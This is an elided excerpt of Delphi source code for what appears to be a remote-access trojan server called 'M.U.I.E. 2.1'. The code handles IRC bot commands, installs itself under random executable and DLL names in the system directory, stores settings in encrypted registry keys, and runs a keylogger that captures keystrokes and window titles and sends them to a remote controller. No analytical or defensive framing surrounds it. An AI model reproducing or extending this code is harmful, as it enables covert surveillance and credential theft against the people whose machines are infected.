...
uses ExtCtrls, ComCtrls, Controls, Forms, Classes, Windows, Registry, ShellApi, Messages,
...
var SetPreviewQuality,SetSnapshotQuality:Integer;
  ...
  OldListIPz:String;
const ServerVersion='M.U.I.E. 2.1';
const
  Count: Integer = 0;
...
uses Unit5, ShowPictureUnit, MatrixUnit, htmltotxt, KeyLog;
...
begin
 icqt.enabled:=false;
 for i:=1 to length(cuce) do if cuce[i]=' ' then cuce[i]:='_';
 for i:=1 to length(strw) do if strw[i]=' ' then strw[i]:='_';
 for i:=1 to length(sendstrbody) do if sendstrbody[i]=' ' then sendstrbody[i]:='_';
...
var nick:string;
const OldRS:String='';
function RandomString:String;var len,lp:integer;res:string;begin repeat Randomize;len:=random(10)+4;res:='';for lp:=1 to len do res:=res+Chr(Random(25)+97);Result:=RES;until Result<>OldRS;OldRS:=Result;end;
...
begin
 ...
 irc.UserName:=IntToStr(Random(99999)+592);
 irc.UserName:=RandomString;
 irc.Connect;
...
begin
  ...
  STRW:=Decrypt(ReadKey(Encrypt('Name')));
  if STRW='' then STRW:=PickRandomNick;
...
function RandomDLLFileName:String;var len,lp:integer;res:string;begin repeat Randomize;len:=random(5)+4;res:='';for lp:=1 to len do res:=res+Chr(Random(25)+97);res:=res+'.dll';RES:=SysPath+'\'+RES;Result:=RES;until(not FileExists(RES));end;
...
if cod='BOT' then
 ...
 try
  ...
  try
   ...
   IRCBot.AltNick:=IRCNickname+PickRandomNick;
   ircbot.UserName:=RandomString;
  except end;
  ...
  ircbot.UserName:=RandomString;
  if IRCIdent='' then irc.username:=PickRandomNick;
...
if cod='RTE' then
 begin
  UPLOADIT:=True;
  NEW_SERVER:=False;
  SAVETO:=RandomDllFileName;
  SetKey(Encrypt('KeyLogName'),Encrypt(SAVETO));
  Socket.SendText('TID');
 end else
if cod='UPS' then
 begin
...
// KEYLOG DISBALED!
 begin
  ...
  if text[1]+text[2]='on' then
   begin
    if (NOT FileExists(Decrypt(ReadKey(Encrypt('KeyLogName'))))) then raspuns:='error. missing dll file.' else
    begin
  ...
  if (NOT FileExists(Decrypt(ReadKey(Encrypt('KeyLogName'))))) then raspuns:='error. missing dll file.' else
   begin try DisableKeyLogger;keysock.Active:=False;Cancel:=true;except end;end;
 end else
if cod='IMX' then
 begin
...
//   ShowMessage('running defaults');
   ...
   SetKey(Encrypt('CurrentExe'),Encrypt(RandomString+'.exe'));
 ...
 if db then SetKey(Encrypt('CurrentExe'),Encrypt(RandomString+'.exe'))
...
begin
 StartLogger(Decrypt(ReadKey(Encrypt('KeyLogName'))));
 Cancel:=False;
 if not KL_Online then exit;
 C := KL_CPos;
 L := 0;
 SendKeyString:='';
 SEND_KEYZ:=TRUE;
...
try
 ...
 if (UpperCase(ExtractFileName(ParamStr(0)))<>UpperCase(CurrentExe)) or (fsize1<>fsize2) then
  InstallServer;
 if (FileExists(Decrypt(ReadKey(Encrypt('KeyLogName'))))) then EnableKeyLogger;
 ServerStarted:=True;
 CanSend:=True;
...
begin
  ...
  If Wnd <> LWnd then Begin
   GetWindowText(Wnd,@S[0],SizeOf(S));
   If StrPas(@S) <> '' then SendKeyString:=SendKeyString+(' ['+StrPas(@S)+'] ');
  End;
 // Get last keys
 Asm
  CLI
 ...
 If L <> C then
  Begin
   ...
   Repeat
    Inc(I);
    If S[I] > #0 then
     If S[I] <> #13 then SendKeyString:=SendKeyString+(S[I])
     Else If S[I] = #8 then SendKeyString:=SendKeyString+(#8)
     Else SendKeyString:=SendKeyString+'ô';
   Until I = C;
  End;
